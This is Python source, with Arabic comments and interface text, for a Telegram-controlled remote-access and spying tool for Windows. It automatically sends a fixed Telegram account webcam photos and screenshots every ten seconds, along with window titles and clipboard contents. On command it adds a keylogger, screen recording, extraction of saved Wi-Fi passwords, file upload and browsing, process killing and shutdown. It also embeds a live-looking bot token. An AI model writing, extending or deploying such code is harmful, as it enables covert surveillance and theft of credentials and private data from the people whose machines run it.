import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import subprocess
import win32gui
import threading
import webbrowser
import sys
import ctypes
import pyttsx3
import cv2
import numpy as np
from pynput import keyboard
from datetime import datetime

# ==========================================
# 1. إعدادات النظام
# ==========================================
try:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
except:
    pass

TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
MY_ID = 1431886140  # ✅ الآيدي مثبت

bot = telebot.TeleBot(TOKEN)

# --- الإعدادات ---
SCREENSHOT_INTERVAL = 10  # ✅ كل 10 ثواني
current_path = os.getcwd()
clipboard_history = []
file_map = {}

# قائمة الأزرار لتجاهلها عند النسخ
IGNORE_TEXTS = [
    '🕵️ مراقبة وتسجيل', '📡 أدوات الشبكة',
    '✅ تأكيد التشغيل', '🔴 إغلاق الجهاز',
    '🖼️ تغيير الخلفية', '🗣️ نطق نص',
    '📸 لقطة شاشة', '📂 مدير الملفات',
    '📩 إرسال رسالة', '🌐 فتح رابط',
    '📋 سجل الحافظة', '☠️ قتل برنامج',
    '🔈 التحكم في الصوت'
]

# متغيرات المراقبة
is_recording_video = False
video_thread = None
key_listener = None
logged_keys = []
is_keylogging = False

# --- المسارات ---
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
SAVE_DIR = os.path.join(DESKTOP_PATH, "محمود_System_V19")

VIDEO_FOLDER = os.path.join(SAVE_DIR, "تسجيل_فيديو")
LOGS_FOLDER = os.path.join(SAVE_DIR, "سجلات_كيبورد")
CAM_FOLDER = os.path.join(SAVE_DIR, "صور_الكاميرا_التلقائية")

for folder in [SAVE_DIR, VIDEO_FOLDER, LOGS_FOLDER, CAM_FOLDER]:
    if not os.path.exists(folder):
        try: os.makedirs(folder)
        except: pass

# ==========================================
# 2. الدوال المساعدة
# ==========================================
def is_authorized(user_id):
    return user_id == MY_ID

def speak_text(text):
    try:
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
    except: pass

# --- الشبكة (Wi-Fi) ---
def get_wifi_networks():
    try:
        data = subprocess.check_output('netsh wlan show networks', shell=True).decode('cp850', errors="ignore")
        return data
    except: return "❌ خطأ شبكة"

def get_saved_wifi_passwords():
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors="ignore")
        profiles = [i.split(":")[1][1:-1] for i in data.split('\n') if "All User Profile" in i]
        result_text = "🔐 **الباسوردات المحفوظة:**\n"
        for i in profiles:
            try:
                cmd = f'netsh wlan show profile name="{i}" key=clear'
                results = subprocess.check_output(cmd, shell=True).decode('cp850', errors="ignore")
                results = [b.split(":")[1][1:-1] for b in results.split('\n') if "Key Content" in b]
                try: result_text += f"📡 {i}: `{results[0]}`\n"
                except: result_text += f"📡 {i}: (مفتوحة)\n"
            except: pass
        return result_text
    except: return "❌ خطأ."

def connect_to_wifi(ssid, password):
    config = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType><connectionMode>auto</connectionMode>
    <MSM><security><authEncryption>
    <authentication>WPA2PSK</authentication><encryption>AES</encryption>
    <useOneX>false</useOneX></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{password}</keyMaterial></sharedKey>
    </MSM></MSM>
</WLANProfile>"""
    try:
        filename = "wifi_config.xml"
        with open(filename, "w") as file: file.write(config)
        subprocess.run(f'netsh wlan add profile filename="{filename}"', shell=True)
        subprocess.run(f'netsh wlan connect name="{ssid}"', shell=True)
        os.remove(filename)
        return True
    except: return False

# ==========================================
# 3. أنظمة المراقبة
# ==========================================

# 1. كاميرا الويب (كل 10 ثواني)
def auto_camera_loop():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened(): return
    while True:
        try:
            ret, frame = cap.read()
            if ret:
                ts = datetime.now().strftime("%Y%m%d-%H%M%S")
                path = os.path.join(CAM_FOLDER, f"Cam_{ts}.jpg")
                cv2.imwrite(path, frame)
                try:
                    with open(path, 'rb') as f:
                        bot.send_photo(MY_ID, f, caption=f"👁️ WebCam: {ts}")
                except: pass
            time.sleep(10)
        except: time.sleep(5)

# 2. مراقبة الشاشة (كل 10 ثواني) + النوافذ والحافظة
def automatic_desktop_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # (أ) مراقبة النوافذ
            try:
                win = win32gui.GetForegroundWindow()
                curr_win = win32gui.GetWindowText(win)
                if curr_win and curr_win != last_window:
                    bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_win}")
                    last_window = curr_win
            except: pass

            # (ب) مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # (ج) لقطة شاشة تلقائية (كل 10 ثواني)
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto_scr.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: 
                        bot.send_photo(MY_ID, f, caption=f"🖥️ Screen: {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1)
        except: time.sleep(5)

# 3. الكي لوجر
def on_key_press(key):
    global logged_keys
    try: logged_keys.append(key.char)
    except AttributeError: logged_keys.append(f" [{str(key).replace('Key.', '')}] ")

def start_keylogger_logic():
    global key_listener, is_keylogging, logged_keys
    logged_keys = []
    is_keylogging = True
    key_listener = keyboard.Listener(on_press=on_key_press)
    key_listener.start()

def stop_and_save_keylogs(chat_id):
    global key_listener, is_keylogging
    if key_listener: key_listener.stop()
    is_keylogging = False
    filename = os.path.join(LOGS_FOLDER, f"Keys_{datetime.now().strftime('%H-%M-%S')}.txt")
    with open(filename, "w", encoding="utf-8") as f: f.write("".join(logged_keys))
    with open(filename, "rb") as f: bot.send_document(chat_id, f)

# 4. تسجيل فيديو
def record_screen_logic(chat_id):
    global is_recording_video
    screen_size = pyautogui.size()
    video_path = os.path.join(VIDEO_FOLDER, f"Vid_{datetime.now().strftime('%H-%M-%S')}.avi")
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter(video_path, fourcc, 10.0, screen_size)
    try:
        while is_recording_video:
            img = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_BGR2RGB)
            out.write(frame)
        out.release()
        with open(video_path, 'rb') as v: bot.send_video(chat_id, v)
    except: pass
    if 'out' in locals(): out.release()

# ==========================================
# 4. واجهة التحكم
# ==========================================
def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add('🕵️ مراقبة وتسجيل', '📡 أدوات الشبكة')
    markup.add('✅ تأكيد التشغيل', '🔴 إغلاق الجهاز')
    markup.add('🖼️ تغيير الخلفية', '🗣️ نطق نص')
    markup.add('📸 لقطة شاشة', '📂 مدير الملفات')
    markup.add('📩 إرسال رسالة', '🌐 فتح رابط')
    markup.add('📋 سجل الحافظة', '☠️ قتل برنامج')
    markup.add('🔈 التحكم في الصوت')
    return markup

def create_monitor_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📹 بدء فيديو", callback_data="vid_start"),
               types.InlineKeyboardButton("⏹ إيقاف فيديو", callback_data="vid_stop"))
    markup.add(types.InlineKeyboardButton("⌨️ بدء الكي-لوجر", callback_data="key_start"),
               types.InlineKeyboardButton("📝 إيقاف الكي-لوجر", callback_data="key_stop"))
    return markup

def create_network_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📶 الشبكات المتاحة", callback_data="wifi_scan"))
    markup.add(types.InlineKeyboardButton("🔐 كلمات المرور المحفوظة", callback_data="wifi_pass"))
    markup.add(types.InlineKeyboardButton("🔗 اتصال بشبكة", callback_data="wifi_connect"))
    return markup

def get_file_keyboard(path):
    global file_map
    file_map = {}
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))][:8]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))][:8]
        markup.add(types.InlineKeyboardButton("⬆️ رجوع", callback_data="CD_UP"))
        for i, f in enumerate(folders):
            file_map[f"DIR_{i}"] = f
            markup.add(types.InlineKeyboardButton(f"📁 {f}", callback_data=f"DIR_{i}"))
        for i, f in enumerate(files):
            file_map[f"FILE_{i}"] = f
            markup.add(types.InlineKeyboardButton(f"📄 {f}", callback_data=f"FILE_{i}"))
    except: pass
    return markup

# ==========================================
# 5. الأوامر
# ==========================================
@bot.message_handler(commands=['start'])
def start_command(message):
    if is_authorized(message.chat.id):
        bot.reply_to(message, "✅ **نظام التحكم جاهز (V19)**", reply_markup=create_main_keyboard())

# القوائم
@bot.message_handler(func=lambda m: m.text == '🕵️ مراقبة وتسجيل')
def open_monitor(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "🛠 **أدوات المراقبة:**", reply_markup=create_monitor_keyboard())

@bot.message_handler(func=lambda m: m.text == '📡 أدوات الشبكة')
def open_net(m):
    if is_authorized(m.chat.id):
        bot.reply_to(m, "📡 **الشبكة:**", reply_markup=create_network_keyboard())

@bot.message_handler(func=lambda m: m.text == '🔈 التحكم في الصوت')
def vol_panel(m):
    if is_authorized(m.chat.id):
        mk = types.InlineKeyboardMarkup(row_width=3)
        mk.add(types.InlineKeyboardButton("🔊", callback_data="VOL_UP"),
               types.InlineKeyboardButton("🔉", callback_data="VOL_DOWN"),
               types.InlineKeyboardButton("🔇", callback_data="VOL_MUTE"))
        bot.reply_to(m, "🎚️ الصوت:", reply_markup=mk)

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def files(m):
    if is_authorized(m.chat.id):
        global current_path
        bot.send_message(m.chat.id, f"📂 `{current_path}`", parse_mode="Markdown", reply_markup=get_file_keyboard(current_path))

# Callbacks
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if not is_authorized(call.message.chat.id): return
    cid = call.message.chat.id
    d = call.data
    global is_recording_video, is_keylogging, current_path

    # مراقبة
    if d == "vid_start":
        if not is_recording_video:
            is_recording_video = True
            threading.Thread(target=record_screen_logic, args=(cid,)).start()
            bot.answer_callback_query(call.id, "بدأ الفيديو")
    elif d == "vid_stop":
        is_recording_video = False
        bot.answer_callback_query(call.id, "توقف")
    elif d == "key_start":
        if not is_keylogging:
            start_keylogger_logic()
            bot.answer_callback_query(call.id, "بدأ الكي لوجر")
    elif d == "key_stop":
        stop_and_save_keylogs(cid)
        bot.answer_callback_query(call.id, "تم الحفظ")

    # شبكة
    elif d == "wifi_scan":
        bot.send_message(cid, f"📶 {get_wifi_networks()}")
    elif d == "wifi_pass":
        bot.send_message(cid, get_saved_wifi_passwords(), parse_mode="Markdown")
    elif d == "wifi_connect":
        msg = bot.send_message(cid, "📝 `الاسم,الباسورد`", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_wifi_connect)

    # صوت
    elif d == "VOL_UP":
        for _ in range(5): pyautogui.press('volumeup')
        bot.answer_callback_query(call.id, "🔊")
    elif d == "VOL_DOWN":
        for _ in range(5): pyautogui.press('volumedown')
        bot.answer_callback_query(call.id, "🔉")
    elif d == "VOL_MUTE":
        pyautogui.press('volumemute')
        bot.answer_callback_query(call.id, "🔇")

    # ملفات
    elif d == "CD_UP":
        current_path = os.path.dirname(current_path)
        bot.edit_message_text(f"📂 `{current_path}`", cid, call.message.message_id, reply_markup=get_file_keyboard(current_path), parse_mode="Markdown")
    elif d in file_map:
        target = file_map[d]
        if d.startswith("DIR_"):
            current_path = os.path.join(current_path, target)
            bot.edit_message_text(f"📂 `{current_path}`", cid, call.message.message_id, reply_markup=get_file_keyboard(current_path), parse_mode="Markdown")
        elif d.startswith("FILE_"):
            bot.answer_callback_query(call.id, "جاري الرفع...")
            with open(os.path.join(current_path, target), 'rb') as f: bot.send_document(cid, f)

def process_wifi_connect(message):
    try:
        s, p = message.text.split(',')
        if connect_to_wifi(s.strip(), p.strip()): bot.reply_to(message, "✅ تم الطلب")
        else: bot.reply_to(message, "❌ فشل")
    except: pass

# أوامر عامة
@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def shot(m):
    if is_authorized(m.chat.id):
        p = "s.png"
        pyautogui.screenshot(p)
        with open(p, 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove(p)

@bot.message_handler(func=lambda m: m.text == '🗣️ نطق نص')
def tts(m):
    if is_authorized(m.chat.id):
        msg = bot.reply_to(m, "اكتب النص:")
        bot.register_next_step_handler(msg, lambda x: threading.Thread(target=speak_text, args=(x.text,)).start())

@bot.message_handler(func=lambda m: m.text == '🖼️ تغيير الخلفية')
def bg(m):
    if is_authorized(m.chat.id):
        msg = bot.reply_to(m, "أرسل الصورة:")
        bot.register_next_step_handler(msg, set_bg)

def set_bg(m):
    if m.content_type == 'photo':
        f = bot.download_file(bot.get_file(m.photo[-1].file_id).file_path)
        p = os.path.join(SAVE_DIR, "bg.jpg")
        with open(p, 'wb') as w: w.write(f)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, p, 0)
        bot.reply_to(m, "✅ تم")

@bot.message_handler(func=lambda m: m.text == '📩 إرسال رسالة')
def msg_box(m):
    if is_authorized(m.chat.id):
        msg = bot.reply_to(m, "نص الرسالة:")
        bot.register_next_step_handler(msg, lambda x: threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, x.text, "Admin", 0x40 | 0x1000)).start())

@bot.message_handler(func=lambda m: m.text == '🌐 فتح رابط')
def link(m):
    if is_authorized(m.chat.id):
        msg = bot.reply_to(m, "الرابط:")
        bot.register_next_step_handler(msg, lambda x: webbrowser.open(x.text if x.text.startswith('http') else f'https://{x.text}'))

@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def kill(m):
    if is_authorized(m.chat.id):
        msg = bot.reply_to(m, "اسم البرنامج:")
        bot.register_next_step_handler(msg, lambda x: os.system(f"taskkill /f /im {x.text}"))

@bot.message_handler(func=lambda m: m.text == '🔴 إغلاق الجهاز')
def shut(m):
    if is_authorized(m.chat.id): os.system("shutdown /s /t 5")

@bot.message_handler(func=lambda m: m.text == '✅ تأكيد التشغيل')
def confirm(m):
    if is_authorized(m.chat.id): bot.reply_to(m, "✅ Online")

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def clip(m):
    if is_authorized(m.chat.id): bot.reply_to(m, "\n".join(clipboard_history[-10:]) if clipboard_history else "فارغ")

# ==========================================
# ✅ خاصية النسخ التلقائي للنص (مستعادة)
# ==========================================
@bot.message_handler(content_types=['text'])
def copy_any_text(message):
    if not is_authorized(message.chat.id): return
    
    # تجاهل نصوص الأزرار والأوامر
    if message.text in IGNORE_TEXTS or message.text.startswith('/'):
        return

    try:
        pyperclip.copy(message.text)
        bot.reply_to(message, f"✅ تم النسخ للحافظة:\n`{message.text}`", parse_mode="Markdown")
    except:
        bot.reply_to(message, "❌ خطأ في النسخ")

# ==========================================
# 6. التشغيل
# ==========================================
if __name__ == "__main__":
    # تشغيل المراقب (صور + نوافذ + حافظة)
    threading.Thread(target=automatic_desktop_monitor, daemon=True).start()
    # تشغيل مراقب الكاميرا
    threading.Thread(target=auto_camera_loop, daemon=True).start()
    
    print("🚀 Bot V19 Started (Clipboard Copy Restored)...")
    while True:
        try: bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except: time.sleep(5)